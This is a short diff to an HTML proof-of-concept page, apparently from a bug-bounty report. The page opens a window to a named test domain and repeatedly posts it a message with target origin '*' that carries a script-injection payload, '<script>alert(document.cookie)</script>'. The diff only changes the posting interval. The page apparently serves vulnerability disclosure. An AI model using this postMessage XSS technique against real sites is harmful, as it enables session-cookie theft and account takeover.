@@ -4,7 +4,7 @@
 hwin = window.open("https://bugbounty-secure.dctest.donorschoose.org");
 setInterval(function(){
  hwin.postMessage('{"action":"showScreenAndOverlay","message":"<script>alert(document.cookie)</script>"}',"*")
-},0.00001)
+},3000)
 </script>
 </body>
 </html>
